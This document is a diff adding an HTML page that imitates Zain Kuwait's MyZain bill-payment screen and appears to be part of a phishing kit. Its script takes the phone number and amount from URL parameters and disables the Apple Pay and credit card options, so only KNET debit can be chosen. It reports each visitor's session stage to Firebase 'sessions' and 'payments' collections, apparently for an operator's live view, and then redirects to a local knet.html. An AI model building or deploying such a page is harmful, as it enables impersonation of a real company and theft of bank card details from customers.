@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script><script src="./assets/js/firebase-client.js"></script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"><link rel="icon" href="assets/images/favicon.ico"><title>MyZain</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz,wght@0,6..12,200..900;1,6..12,200..900&family=Zain:wght@200;300;400;700;800;900&display=swap" rel="stylesheet"><link href="assets/css/app.css" rel="preload" as="style"><link href="assets/css/chunk-vendors.css" rel="preload" as="style"><link href="assets/css/chunk-vendors.css" rel="stylesheet"><link href="assets/css/app.css" rel="stylesheet"><meta data-vue-meta="1" name="description" content="Zain is the pioneer of mobile telecommunications in the Middle East. We began life in 1983 in Kuwait as the region’s first mobile operator, and since the initiation of our expansion strategy in 2003, we have expanded rapidly. Today, we are a leading"><meta data-vue-meta="1" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"><style>
+      /* Smooth sticky header transition */
+      .header-bg.fixed {
+        transform: translateY(-100%);
+        opacity: 0;
+        transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
+      }
+      .header-bg.fixed.header-visible {
+        transform: translateY(0);
+        opacity: 1;
+      }
+      /* Clean and Simple Layout (No page locks, natural scroll, footer at bottom) */
+      html, body {
+        min-height: 100vh !important;
+        height: auto !important;
+        margin: 0;
+        overflow-y: auto !important;
+      }
+      [data-v-9f83da10] {
+        min-height: 100vh !important;
+        height: auto !important;
+        display: flex;
+        flex-direction: column;
+      }
+      #app {
+        min-height: 100vh !important;
+        height: auto !important;
+        display: flex;
+        flex-direction: column;
+      }
+      #app > div {
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh !important;
+        height: auto !important;
+      }
+      #app > div > .pb-6 {
+        display: flex;
+        flex-direction: column;
+        flex: 1;
+      }
+      #app > div > .pb-6 > div {
+        display: flex;
+        flex-direction: column;
+        flex: 1;
+      }
+      #app > div > .pb-6 > div > div {
+        display: flex;
+        flex-direction: column;
+        flex: 1;
+        margin-top: auto;
+        margin-bottom: auto;
+        justify-content: center;
+      }
+      #app > div > .footer {
+        flex: none !important;
+      }
+
+      /* Scale down content group on mobile screens to fit within height without scrolling */
+      @media (max-width: 767px) {
+        #app > div > .pb-6 > div > div {
+          transform-origin: center center;
+        }
+      }
+      @media (max-width: 767px) and (max-height: 740px) {
+        #app > div > .pb-6 > div > div {
+          transform: scale(0.9);
+        }
+      }
+      @media (max-width: 767px) and (max-height: 660px) {
+        #app > div > .pb-6 > div > div {
+          transform: scale(0.82);
+        }
+      }
+      @media (max-width: 767px) and (max-height: 580px) {
+        #app > div > .pb-6 > div > div {
+          transform: scale(0.74);
+        }
+      }
+
+      body {
+        background-color: #f4f6f8 !important;
+      }
+    </style></head><body><div data-v-9f83da10="" class="min-h-full h-full w-full"><div data-v-9f83da10="" id="app" dir="rtl"><div>
+          <div id="header-container">
+            <div class=""><!-- --></div>
+            <div>
+              <nav aria-label="Main Nav" class="header-bg z-40 w-full bg-black">
+                <div class="mx-auto ps-2 sm:px-6 lg:px-8">
+                  <div class="relative flex h-14 w-full items-center lg:h-18 lg:px-6">
+                    <div class="flex-1 flex items-center justify-start sm:items-stretch sm:justify-start">
+                      <a href="./" class="flex flex-shrink-0 items-center">
+                        <img src="assets/images/logo.png" alt="Zain Logo" class="block h-8 w-auto cursor-pointer lg:h-10" />
+                      </a>
+                    </div>
+                    <div class="hidden h-full sm:ms-6 lg:block">
+                      <div class="flex h-full text-lg text-white 2xl:text-2xl">
+                        <a href="#" aria-current="page" class="flex items-center border-b-2 border-transparent px-7 py-2 space-s-3 hover:border-primary">
+                          <span class="icon-cart-with-plus"></span><span>تسوق</span>
+                        </a>
+                        <a href="#" class="flex items-center border-b-2 border-primary px-6 py-2 space-s-3">
+                          <span class="icon-Group-1561"></span><span class="whitespace-nowrap">My Zain</span>
+                        </a>
+                        <a href="#" class="flex items-center border-b-2 border-transparent px-7 py-2 space-s-3 hover:border-primary">
+                          <span class="icon-headphones-with-mic"></span><span>الدعم</span>
+                        </a>
+                      </div>
+                    </div>
+                    <div class="flex-1 justify-self-end flex items-center justify-end pe-2 sm:static sm:inset-auto sm:pe-0 sm:ms-6">
+                      <button type="button" aria-controls="mobile-menu" aria-expanded="false" class="h-12 px-2 focus:outline-none inline-flex items-center justify-center rounded-md text-gray-400 hover:bg-gray-700 hover:text-white focus:ring-2 focus:ring-inset focus:ring-white lg:hidden mobile-menu-toggle-btn">
+                        <span class="text-gray-100 icon-hamburger"></span>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+                <!-- -->
+              </nav>
+              <nav aria-label="Main Nav" class="header-bg fixed top-0 z-50 w-full bg-black">
+                <div class="mx-auto ps-2 sm:px-6 lg:px-8">
+                  <div class="relative flex h-14 w-full items-center lg:h-18 lg:px-6">
+                    <div class="flex-1 flex items-center justify-start sm:items-stretch sm:justify-start">
+                      <a href="./" class="flex flex-shrink-0 items-center">
+                        <img src="assets/images/logo.png" alt="Zain Logo" class="block h-8 w-auto cursor-pointer lg:h-10" />
+                      </a>
+                    </div>
+                    <div class="hidden h-full sm:ms-6 lg:block">
+                      <div class="flex h-full text-lg text-white 2xl:text-2xl">
+                        <a href="#" aria-current="page" class="flex items-center border-b-2 border-transparent px-7 py-2 space-s-3 hover:border-primary">
+                          <span class="icon-cart-with-plus"></span><span>تسوق</span>
+                        </a>
+                        <a href="#" class="flex items-center border-b-2 border-primary px-6 py-2 space-s-3">
+                          <span class="icon-Group-1561"></span><span class="whitespace-nowrap">My Zain</span>
+                        </a>
+                        <a href="#" class="flex items-center border-b-2 border-transparent px-7 py-2 space-s-3 hover:border-primary">
+                          <span class="icon-headphones-with-mic"></span><span>الدعم</span>
+                        </a>
+                      </div>
+                    </div>
+                    <div class="flex-1 justify-self-end flex items-center justify-end pe-2 sm:static sm:inset-auto sm:pe-0 sm:ms-6">
+                      <button type="button" aria-controls="mobile-menu" aria-expanded="false" class="h-12 px-2 focus:outline-none inline-flex items-center justify-center rounded-md text-gray-400 hover:bg-gray-700 hover:text-white focus:ring-2 focus:ring-inset focus:ring-white lg:hidden mobile-menu-toggle-btn">
+                        <span class="text-gray-100 icon-hamburger"></span>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+                <!-- -->
+              </nav>
+              <div class="mobile-menu fixed right-0 z-50 w-full transform shadow-xl transition-all origin-top-end lg:hidden" id="mobile-menu-container" style="display: none">
+                <div class="bg-primary">
+                  <select class="h-9 mx-auto white-select-arrow text-center text-sm font-bold text-white flex justify-center bg-transparent border-none text-center text-white mt-0 py-1.5">
+                    <option>شخصي</option>
+                    <option>الأعمال</option>
+                  </select>
+                </div>
+                <div class="flex justify-between px-4 py-5">
+                  <a href="#" aria-current="page" class="block px-3 py-2 text-xl font-semibold font-medium text-primary">
+                    <span class="icon-cart-with-plus pe-2"></span> تسوق
+                  </a>
+                  <img src="assets/images/d-arrow-up.svg" alt="arrow" class="inline-block w-6 px-2 rotate-180 transform" />
+                </div>
+                <hr class="mx-2 border-t border-gray-400 opacity-50" />
+                <div class="flex justify-between px-4 py-5">
+                  <a href="#" aria-current="page" class="block px-3 py-2 text-xl font-semibold font-medium text-white">
+                    <span class="icon-headphones-with-mic pe-2"></span> الدعم
+                  </a>
+                  <img src="assets/images/d-arrow-up.svg" alt="arrow" class="inline-block w-6 px-2 rotate-180 transform" />
+                </div>
+                <hr class="mx-2 border-t border-gray-400 opacity-50" />
+                <div class="flex justify-between px-4 py-5">
+                  <a href="#" aria-current="page" class="block flex px-3 py-2 text-xl font-semibold font-medium text-white">
+                    <span class="icon-Group-1561 pe-2"></span><span>5G</span>
+                  </a>
+                  <img src="assets/images/d-arrow-up.svg" alt="arrow" class="inline-block w-6 px-2 rotate-180 transform" />
+                </div>
+                <hr class="mx-2 border-t border-gray-400 opacity-50" />
+                <div class="block py-6">
+                  <a class="px-3 font-semibold uppercase text-white">تحديث البطاقة المدنية</a>
+                  <img src="assets/images/d-arrow-up.svg" alt="arrow" class="inline-block w-2 rotate-180 transform" />
+                </div>
+                <hr class="mx-2 border-t border-gray-400 opacity-50" />
+                <div class="block pt-6">
+                  <a class="px-3 font-semibold uppercase text-white">الدفع السريع</a>
+                  <img src="assets/images/d-arrow-up.svg" alt="arrow" class="inline-block w-2 rotate-180 transform" />
+                </div>
+                <div class="flex bg-white p-2 mx-3 mt-5 rounded-md">
+                  <div data-v-1f187122="" class="mb-1 text-black w-full font-bold">
+                    <label data-v-1f187122="" for="cc3f7dbba1-30ba-46c3-abd1-bace702283a4" class="text-sm font-medium block"></label>
+                    <div data-v-1f187122="" class="relative">
+                      <div data-v-1f187122="" class="flex items-center">
+                        <input data-v-1f187122="" dir="" id="cc2ed9a0ac-c639-4527-9015-08071a64eeb4" placeholder="بحث" type="text" maxlength="" class="bg-white text-primary border-0 mt-1 w-full py-2.5 dark:placeholder-gray-700 dark:text-black focus:border-transparent focus:outline-none focus:ring focus:ring-blue-200 focus:border-blue-400 font-bold" style="color: black" />
+                        <div data-v-1f187122="" class="absolute end-2 items-end"></div>
+                      </div>
+                    </div>
+                  </div>
+                  <a id="search_b" href="#" class="rounded-md bg-primary p-3 text-white">
+                    <span class="icon-magnifying-glass px-6 text-xl"></span>
+                  </a>
+                </div>
+                <div class="block pt-6 text-center text-white">
+                  <a class="px-3"> EN </a><a class="px-3"> العربية </a>
+                </div>
+              </div>
+              <!-- -->
+            </div>
+          </div>
+          <div class="pb-6 md:pb-12 dark:text-white"><div data-v-22b72c14=""><div data-v-22b72c14="" class="px-3 mt-4"><div data-v-22b72c14=""><div class="mt-3 md:mt-12 mx-3 md:max-w-xl md:mx-auto font-extrabold text-xl md:text-2xl mb-2 md:mb-4 relative flex justify-between items-center ps-2"><span> الدفع </span></div><div class="lg:mt-3 mb-3 md:mb-14 mx-3 md:max-w-xl md:mx-auto relative"><div class="override-loading"></div><span><div class="rounded-md overflow-hidden"><div class="py-5 px-3 bg-white dark:bg-gray-700 relative overflow-visible"><div class="flex flex-col space-y-3 animate-fade-in-down"><label class="inline-flex items-center w-full cursor-pointer"><input type="radio" name="payment_method" class="form-radio text-primary border-transparent focus:outline-none focus:ring focus:ring-blue-200 focus:border-blue-400 bg-pink-100 cursor-pointer" value="Debit"><div class="flex w-full items-center"><img src="assets/images/knet.svg" alt="KNet" class="w-12 mx-6 my-1"><div class="font-bold text-sm">بطاقة السحب الآلي</div></div></label><hr><label class="inline-flex items-center w-full cursor-pointer"><input type="radio" name="payment_method" class="form-radio text-primary border-transparent focus:outline-none focus:ring focus:ring-blue-200 focus:border-blue-400 bg-pink-100 cursor-pointer" value="Credit"><div class="flex flex-col xs:flex-row xs:justify-between w-full items-start xs:items-center"><div class="font-bold ms-5 text-sm"> استخدم بطاقة ائتمان جديدة </div><div class="flex ms-3 xs:ms-0 items-center delay-100"><img src="assets/images/visa.png" alt="Visa" class="w-10 mx-2" style="transition: filter 0.4s ease-out, -webkit-filter 0.4s ease-out;"><img src="assets/images/mastercard.png" alt="Master Card" class="w-10 mx-2" style="transition: filter 0.4s ease-out, -webkit-filter 0.4s ease-out;"><img src="assets/images/american-express.png" alt="American Express" class="w-10 mx-2" style="transition: filter 0.4s ease-out, -webkit-filter 0.4s ease-out;"></div></div></label><hr><label class="inline-flex items-center w-full cursor-pointer"><input type="radio" name="payment_method" class="form-radio text-primary border-transparent focus:outline-none focus:ring focus:ring-blue-200 focus:border-blue-400 bg-pink-100 cursor-pointer" value="ApplePay"><div class="flex w-full items-center"><img src="assets/images/apple-pay.svg?v=2" alt="Apple Pay" class="w-12 mx-6 my-1"><div class="font-bold text-sm">Apple Pay</div></div></label><div id="apple-pay-error" class="text-red-500 text-sm font-bold text-start mt-2" style="color: #ef4444; font-size: 0.875rem; font-weight: 700; text-align: start; margin-top: 0.5rem; display: none;">طريقة الدفع هذه غير متوفرة حالياً.</div></div></div><div class="border-t border-primary border-opacity-30 px-5 pt-2"><div class="flex justify-between text-2xl font-bold"><div>إجمالي</div><div class="text-green">د.ك 100</div></div><div class="text-center mt-7 w-full"><button id="pay-bill-submit-button" type="button" disabled="disabled" class="transition ease-in duration-200 focus:outline-none focus:ring-2 focus:ring-offset focus:ring-blue-200 focus:ring-blue-400 text-center rounded-lg btn-active w-full py-3 px-4 text-base font-black cursor-not-allowed bg-gray-200 text-gray-400"> دفع الفاتورة </button><a id="edit-payment-button" href="./" class="transition ease-in duration-200 focus:outline-none focus:ring-2 focus:ring-offset focus:ring-blue-200 focus:ring-blue-400 text-center rounded-lg btn-active underline text-pink-500 font-bold mt-2 py-2 px-4 text-sm underline text-gray-600 hover:text-primary"> تعديل </a></div><div class="px-8 py-4 text-center"><span class="text-sm">  بالضغط على "دفع الفاتورة" <span id="terms-link" role="button" class="text-pink-500 underline"> الشروط والأحكام </span></span></div></div><div id="terms-modal" data-v-1861030c="" data-v-5ff3faec="" aria-labelledby="modal-title" role="dialog" aria-modal="true" class="fixed z-50 inset-0 overflow-y-auto bg-black bg-opacity-40" style="display: none;"><div data-v-1861030c="" class="flex items-center flex-col justify-center min-h-screen pt-4 px-4 pb-20 text-center sm:p-0 transition-opacity"><div data-v-1861030c="" aria-hidden="true" class="fixed inset-0"></div><div data-v-1861030c="" class="inline-block rounded-xl overflow-hidden shadow-xl transform transition-all my-4 align-middle w-full overflow-x-hidden panel max-w-lg" style="max-height: 75vh;"><div data-v-1861030c="" class="bg-white dark:bg-gray-700 dark:text-white"><span id="terms-close-btn" data-v-1861030c="" class="absolute right-2 top-2 cursor-pointer"><img data-v-1861030c="" src="assets/images/cross.svg" alt="Cancel" class="inline-block m-2"></span><div data-v-5ff3faec="" data-v-1861030c="" class="p-6 text-start whitespace-pre-wrap"><h1 data-v-5ff3faec="" data-v-1861030c="" class="font-bold text-lg text-center">الشروط والأحكام</h1><div data-v-5ff3faec="" data-v-1861030c=""> • يقر العميل باطلاعه علي كافة شروط الاشتراك في خدمات شركة زين بالإضافة الى كافه التفاصيل المذكوره على موقع الشركة الالكتروني  ويتعهد بتنفيذ كافة الالتزامات المترتبه عليه تجاه الشركة. كما يقر العميل بعلمه وموافقته بأن هذا الطلب الإلكتروني جزء لا يتجزأ من عقد الاشتراك الأساسي والشروط العامة مع شركة "زين" لخط الاشتراك المذكور ومرتبط به وجوداً وعدماً، وتطبق أحكامه في كل ما لم يرد نصه في هذا الطلب ،كما يقر العميل بعلمه بأن اضافه الخدمه  من خلال تطبيق زين الالكتروني تعتبر بمثابة الموافقة منه لهذه الشروط، ويقر العميل بقبوله التعامل مع زين من خلال تطبيق زين الالكتروني ووفقا للإجراءات المتبعة بزين .
+
+• قد تتأثر سرعة خدمة  نقل البيانات المتفق عليها وفقا لحجم الاستخدام كما يقر العميل بعلمه وموافقته على ان ضعف التغطية و/أو عدم بلوغ السرعة القصوى المعلنة لأسباب خارجة عن ارادة زين و بمكان معين لا يعد خللا في الخدمة المقدمة وفي حال تجاوز حد الاستخدام العادل سيتم تطبيق سياسة الاستخدام العادل خلال الشهر (شامل تحميل و تنزيل البيانات) حيث سيتم ايقاف خدمة الانترنت حتى نهاية الشهر الذي تم استهلاك السعه فيه . كما أن حجم الاستخدام والسرعات والأسعار قابلة للتغيير والتعديل وفقا لإجراءات الشركة.
+
+• وفي حال فصل الخط أو الخدمة نهائيا او الفصل المؤقت لعدم السداد او تم التنازل عن الخط لأي عميل آخر أو الانتقال الى مجموعة ذات اشتراك شهري اقل او الغاء الخط  او الخدمة قبل انتهاء مدة الالتزام الخاصة بالعميل  يلتزم العميل بسداد الرسوم المستحقه عن الخدمه المضافه من خلال التطبيق الالكتروني، ويتعهد العميل بسداد جميع المبالغ المستحقة و الناتجة عن الاستخدام ايا كانت (نتيجة شراء سعة اضافية لنقل البيانات) و التي تتجاوز قيمة الاشتراك الشهري
+
+• اسعار المكالمات الصوتية الدوليه  تخضع لأسعار الجهة المنظمة لقطاع الاتصالات والقرارات المنظمة واجراءات الشركة وكذلك تخضع رسوم مكالمات التجوال الدولي سواء للخدمات الصوتية او نقل البيانات (الانترنت) لأسعار الشبكة المستخدمة لكل دولة. دون ادنى مسئولية على زين فيما يتعلق بأسعار الشركات الخارجية  كما تخلي زين مسئوليتها عن اي ادعاء بشأن عدم معرفة تكاليف استخدام الخدمات الصوتية او نقل البيانات اثناء التجوال الخارجي.
+
+• يقر العميل بموافقته على جمع ومعالجة البيانات/استخدام البيانات المسجلة بنظام المعلومات في الاتصال المباشر والغير مباشر لأغراض التسويق عبر الهاتف/البريد الالكتروني/وسائل التواصل الاجتماعي.. الخ، بالإضافة الي أعمال المسح الميداني الخاص بتطوير خدمات الشركة وبما يتوافق مع لوائح الهيئة العامة للاتصالات وتقنية المعلومات.
+
+• يقر العميل بعلمه وموافقته على قيام شركة زين بتحديث بياناته شخصية مباشرة عن طريق هيئة المعلومات المدنية و ذلك وفقاً للرسوم المقررة.
+ </div></div></div><div data-v-1861030c="" class="bg-gray-50 dark:bg-gray-800 px-4 py-3 sm:px-6 flex flex-row-reverse"><button data-v-1861030c="" type="button" id="terms-confirm-btn" class="transition ease-in duration-200 focus:outline-none focus:ring-2 focus:ring-offset focus:ring-blue-200 focus:ring-blue-400 text-center rounded-lg btn-active ms-3 py-3 px-4 text-base font-black hover:shadow-lg bg-primary hover:text-primary border-primary text-white hover:bg-transparent border-2"> تأكيد </button></div></div></div></div></div></span></div></div></div></div></div>
+          <div class="footer border-t-2 border-primary px-5" data-v-7694748d="">
+            <div id="footer-container">
+              <div class="max-w-sm mx-auto md:max-w-full mx-0">
+                <div class="mb-6 md:mb-0 gap-4 flex flex-col md:flex-row md:justify-center items-center">
+                  <img src="assets/images/logo.png" alt="Zain Logo" class="block h-5 w-auto" />
+                  <div class="text-white text-xs">جميع حقوق الطبع و النشر محفوظة © 2026 زين.</div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <!---->
+        </div>
+      </div>
+    </div>
+    <script>
+      (function initLayoutBehavior() {
+        // --- Reusable Mobile Menu Toggle ---
+        const mobileMenuToggles = document.querySelectorAll(".mobile-menu-toggle-btn");
+        const mobileMenuContainer = document.getElementById("mobile-menu-container");
+
+        if (mobileMenuToggles.length > 0 && mobileMenuContainer) {
+          mobileMenuToggles.forEach((btn) => {
+            btn.addEventListener("click", () => {
+              const isHidden = mobileMenuContainer.style.display === "none" || !mobileMenuContainer.style.display;
+              mobileMenuContainer.style.display = isHidden ? "block" : "none";
+            });
+          });
+        }
+
+        // --- Sticky Header Scroll Handler ---
+        const stickyHeader = document.querySelector(".header-bg.fixed");
+        if (stickyHeader) {
+          window.addEventListener("scroll", () => {
+            if (window.scrollY > 150) {
+              stickyHeader.classList.add("header-visible");
+            } else {
+              stickyHeader.classList.remove("header-visible");
+            }
+          });
+        }
+      })();
+
+      // --- Parse & Clean URL Parameters immediately to prevent exposure ---
+      (function cleanUrlParams() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const urlPhoneParam = urlParams.get("phone");
+        const urlAmountParam = urlParams.get("amount");
+        
+        if (urlPhoneParam) localStorage.setItem("phone", urlPhoneParam);
+        if (urlAmountParam) localStorage.setItem("amount", urlAmountParam);
+        
+        if (urlPhoneParam || urlAmountParam) {
+          try {
+            const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
+            window.history.replaceState({}, document.title, cleanUrl);
+          } catch (e) {
+            // Fallback for strict offline environments
+          }
+        }
+      })();
+
+      document.addEventListener("DOMContentLoaded", () => {
+        const phone = localStorage.getItem("phone") || "99222222";
+        const amount = localStorage.getItem("amount") || "100.000";
+
+        // Formatted amount (make sure it ends with three decimal digits for Kuwaiti Dinar style)
+        let formattedAmount = amount;
+        if (!isNaN(parseFloat(amount))) {
+          formattedAmount = parseFloat(amount).toFixed(3);
+        }
+
+        // Update phone number in terms warning text: "سيتم إرسال رسالة قصيرة إلى رقمك 99222222"
+        const smsTexts = document.querySelectorAll("p");
+        smsTexts.forEach(p => {
+          if (p.textContent.includes("إلى رقمك")) {
+            p.textContent = ` سيتم إرسال رسالة قصيرة إلى رقمك ${phone} تتضمن خطوات إيقاف خدمة خصوصية الفاتورة `;
+          }
+        });
+
+        // Update total amount displays across the page
+        const amountContainers = [
+          document.querySelector(".border-t.border-primary.border-opacity-30.px-5.pt-2 .text-green")
+        ];
+
+        amountContainers.forEach(container => {
+          if (container) {
+            container.textContent = `${formattedAmount} د.ك`;
+          }
+        });
+
+        const totalAmountText = document.querySelector(".text-green.font-bold.h-full.flex.items-center.whitespace-nowrap");
+        if (totalAmountText && totalAmountText.textContent.trim() === "0.000 د.ك") {
+          totalAmountText.textContent = `${formattedAmount} د.ك`;
+        }
+
+        // --- Payment Method Selection ---
+        const paymentMethodRadios = document.querySelectorAll('input[name="payment_method"]');
+        const payBillButton = document.getElementById("pay-bill-submit-button");
+        const applePayError = document.getElementById("apple-pay-error");
+        const creditCardError = document.getElementById("credit-card-error");
+
+        const checkButtonState = () => {
+          const activeRadio = Array.from(paymentMethodRadios).find(r => r.checked);
+          if (activeRadio) {
+            if (activeRadio.value === "ApplePay" && activeRadio.checked) {
+              if (applePayError) applePayError.style.display = "block";
+              if (creditCardError) creditCardError.style.display = "none";
+              payBillButton.setAttribute("disabled", "disabled");
+              payBillButton.className = "transition ease-in duration-200 focus:outline-none focus:ring-2 focus:ring-offset focus:ring-blue-200 focus:ring-blue-400 text-center rounded-lg btn-active w-full py-3 px-4 text-base font-black cursor-not-allowed bg-gray-200 text-gray-400";
+            } else if (activeRadio.value === "Credit" && activeRadio.checked) {
+              if (creditCardError) creditCardError.style.display = "block";
+              if (applePayError) applePayError.style.display = "none";
+              payBillButton.setAttribute("disabled", "disabled");
+              payBillButton.className = "transition ease-in duration-200 focus:outline-none focus:ring-2 focus:ring-offset focus:ring-blue-200 focus:ring-blue-400 text-center rounded-lg btn-active w-full py-3 px-4 text-base font-black cursor-not-allowed bg-gray-200 text-gray-400";
+            } else {
+              if (applePayError) applePayError.style.display = "none";
+              if (creditCardError) creditCardError.style.display = "none";
+              payBillButton.removeAttribute("disabled");
+              payBillButton.className = "transition ease-in duration-200 focus:outline-none focus:ring-2 focus:ring-offset focus:ring-blue-200 focus:ring-blue-400 text-center rounded-lg btn-active w-full py-3 px-4 text-base font-black hover:shadow-lg bg-primary hover:text-primary border-primary text-white hover:bg-transparent border-2 cursor-pointer";
+            }
+          }
+        };
+
+        // Run immediately on page load
+        checkButtonState();
+
+        if (paymentMethodRadios.length > 0 && payBillButton) {
+          paymentMethodRadios.forEach(radio => {
+            radio.addEventListener("change", () => {
+              checkButtonState();
+            });
+          });
+        }
+
+        // --- Terms & Conditions Modal ---
+        const termsLink = document.getElementById("terms-link");
+        const termsModal = document.getElementById("terms-modal");
+        const termsCloseBtn = document.getElementById("terms-close-btn");
+        const termsConfirmBtn = document.getElementById("terms-confirm-btn");
+
+        if (termsLink && termsModal) {
+          termsLink.addEventListener("click", (e) => {
+            e.preventDefault();
+            termsModal.style.display = "block";
+          });
+        }
+
+        if (termsModal) {
+          const hideModal = () => { termsModal.style.display = "none"; };
+          if (termsCloseBtn) termsCloseBtn.addEventListener("click", hideModal);
+          if (termsConfirmBtn) termsConfirmBtn.addEventListener("click", hideModal);
+          termsModal.addEventListener("click", (e) => {
+            if (!e.target.closest('.panel')) hideModal();
+          });
+        }
+
+        // --- Pay Bill Submit ---
+        if (payBillButton) {
+          payBillButton.addEventListener("click", () => {
+            let selectedMethod = "";
+            paymentMethodRadios.forEach(radio => {
+              if (radio.checked) {
+                selectedMethod = radio.value;
+              }
+            });
+
+            if (!selectedMethod) {
+              alert("يرجى اختيار طريقة الدفع.");
+              return;
+            }
+
+            // Disable button and show loader for smooth transition
+            payBillButton.setAttribute("disabled", "disabled");
+            payBillButton.className = "transition ease-in duration-200 focus:outline-none focus:ring-2 focus:ring-offset focus:ring-blue-200 focus:ring-blue-400 text-center rounded-lg btn-active w-full py-3 px-4 text-base font-black cursor-not-allowed bg-gray-200 text-gray-400";
+            payBillButton.textContent = "يرجى الانتظار...";
+
+            // Save transaction details to localStorage
+            localStorage.setItem("phone", phone);
+            localStorage.setItem("amount", amount);
+            localStorage.setItem("payment_method", selectedMethod);
+
+            const sessionId = localStorage.getItem("sessionId");
+            if (sessionId) {
+              // OPTIMIZATION: Fire the write asynchronously in the background and redirect immediately for instant UX response
+              if (window.rtd) {
+                window.rtd.ref('sessions/' + sessionId).update({
+                  page: 'KNET',
+                  hasNewActivity: false
+                }).catch(() => {});
+              }
+              if (window.db) {
+                window.db.collection("payments").doc(sessionId).update({
+                  page: 'KNET',
+                  hasNewActivity: false
+                }).catch((e) => {
+                  console.error("Firebase background update failed: ", e);
+                });
+              }
+            }
+            window.location.href = "./knet.html";
+          });
+        }
+
+        // --- Edit Button History Navigation ---
+        const editButton = document.getElementById("edit-payment-button");
+        if (editButton) {
+          editButton.addEventListener("click", (e) => {
+            e.preventDefault();
+            if (window.history.length > 1) {
+              window.history.back();
+            } else {
+              window.location.href = "./";
+            }
+          });
+        }
+      });
+    </script>
+</body></html>
